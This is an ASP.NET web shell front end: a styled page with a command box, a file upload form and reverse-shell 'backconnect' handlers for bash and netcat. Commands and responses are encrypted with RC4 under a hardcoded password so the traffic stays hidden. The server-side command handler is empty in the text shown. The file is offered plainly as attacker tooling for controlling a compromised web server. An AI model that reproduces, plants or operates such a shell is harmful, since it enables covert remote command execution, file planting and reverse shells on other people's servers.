<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html>

<script runat="server">
    protected void Page_load(object sender, EventArgs e)
    {

    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <!-- css -->
    <style type="text/css" media="screen">
		body{
			background-color:#080808;
			font-family: Consolas,monospace,serif;
			color: #53a9f1;
			font-size: 15px;
		}

		#cmd{
			background: url("/images/search-dark.png") no-repeat 10px 6px #444;
		    width: 300px;
		    margin-left: 35%;
		    margin-bottom: 2%;
		    font: 12px Consolas,Helvetica,Sans-serif;
		    padding: 6px 15px 6px 35px;
		    -webkit-border-radius: 20px;
		    -moz-border-radius: 20px;
		    border-radius: 20px;
		}

		#password{
			background: url("/images/search-dark.png") no-repeat 10px 6px #444;
		    width: 100px;
		    margin-left: 20%;
		    margin-bottom: 2%;
		    font: 12px Consolas,Helvetica,Sans-serif;
		    padding: 6px 15px 6px 35px;
		    -webkit-border-radius: 20px;
		    -moz-border-radius: 20px;
		    border-radius: 20px;
		}

		#output{
			background: 10px 6px #444;
			margin: 0px; 
			width: 75%; 
			height: 500px;
		    font: 14px Consolas,Helvetica,Sans-serif;
		    -webkit-border-radius: 10px;
		    -moz-border-radius: 10px;
		    border-radius: 10px;
		}

		#info{
			background: 10px 6px #444;
			margin: 0px; 
			width: 23%; 
			height: 500px;
		    font: 14px Consolas,Helvetica,Sans-serif;
		    -webkit-border-radius: 10px;
		    -moz-border-radius: 10px;
		    border-radius: 10px;
		}

		.textform{
		    border: 0 none;
		    color: #03FC15;
		    text-shadow: 0 2px 2px rgba(0, 0, 0, 0.3);
		    -webkit-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    -moz-box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    box-shadow: 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 3px rgba(0, 0, 0, 0.2) inset;
		    -webkit-transition: all 0.7s ease 0s;
		    -moz-transition: all 0.7s ease 0s;
		    -o-transition: all 0.7s ease 0s;
		    transition: all 0.7s ease 0s;
		}

		#cmd autofocus{
			width: 200px;
		}
	</style>
    <!-- javascript boots -->
     <script type="text/javascript" src="/scripts/jquery-1.10.2.min.js"></script> 
</head>
<body>
    <!-- input form -->
	<input type="text" id="cmd" class="textform" placeholder="Command line ..." autofocus>
	<input type="submit" id="sendCommand" value="Execute">
	<input type="password" id="password" class="textform" value="cns3c_p4swd" placeholder="password for encrypt"><br>
	<!-- output -->
	<textarea id="output" class="textform" id="" cols="30" rows="10"></textarea>
	<textarea id="info" class="textform" id="" cols="30" rows="10"></textarea>
	<!-- upload -->
	<form id='uploadform' method="post" enctype="multipart/form-data">
	    <input type="text" name="f" id="folder" placeholder="Destination folder">
	    <input type="file" name="data_upload", id="data_upload">
	    <input type="submit" value="Upload" name="submit">
	</form>

    <!-- javascript events -->
    <script type="text/javascript">
		// event press enter key
		$("#cmd").keydown(function(e){
			if (e.keyCode == 13){
				$("#sendCommand")[0].click();
			}
		})
		// action send command
		$("#sendCommand").click(function(){
			cmd = encrypt($('#cmd')[0].value);

			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					'password': cmd,
				},
				success: function(data){
					$('#output').html($('#output').html() + decrypt(data));
				}
			});
		});
		// action upload
		$('#uploadform').submit(function(e){
			e.preventDefault();
			folder = this.f.value;
			dir = encrypt( folder );
			$('#folder').val(dir);

			var params = $(this).serializeArray();
			var files = $('#data_upload')[0].files;
			var formdata = new FormData();

			formdata.append("data_upload", files[0]);
			formdata.append("f", params[0].value);
			
			$.ajax({
				type: 'post',
				url: window.location.href,
				data: formdata,
        		contentType: false,
        		processData: false,
				success: function(data){
					$('#folder').val(folder);
					alert(decrypt(data));
				},
				error: function(error){
					console.log(error);
				}
			});
		})
		// action backconnect via bash
		$('#bash').click(function(e){
			host = $('#host')[0].value;
			if(host.split("://").length == 2){
				host = host.split("://")[1];
			}
			port = $('#port')[0].value;

			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					're_bash'	: true,
					'host'		: encrypt(host),
					'port'		: encrypt(port)
				},
				success: function(data){
					console.log(decrypt(data));
				},
				error: function(error){

				}
			})
		})
		// action backconnect via netcat
		$('#nc').click(function(e){
			host = $('#host')[0].value;
			if(host.split("://").length == 2){
				host = host.split("://")[1];
			}
			port = $('#port')[0].value;
			$.ajax({
				type: 'post',
				url: window.location.href,
				data: {
					're_netcat'	: true,
					'host'		: encrypt(host),
					'port'		: encrypt(port)
				},
				success: function(data){
					console.log(decrypt(data));
				},
				error: function(error){

				}
			})
		})
		// Algorithm RC4 
		function rc4(key, str) {
			var s = [], j = 0, x, res = '';
			for (var i = 0; i < 256; i++) {
				s[i] = i;
			}
			for (i = 0; i < 256; i++) {
				j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
			}
			i = 0;
			j = 0;
			for (var y = 0; y < str.length; y++) {
				i = (i + 1) % 256;
				j = (j + s[i]) % 256;
				x = s[i];
				s[i] = s[j];
				s[j] = x;
				res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
			}
			return res;		}

		function encrypt(text){
			key = $('#password')[0].value;
			return btoa(rc4(key, text));
		}

		function decrypt(text){
			key = $('#password')[0].value;
			return rc4(key, atob(text));
		}
	</script>
</body>
</html>
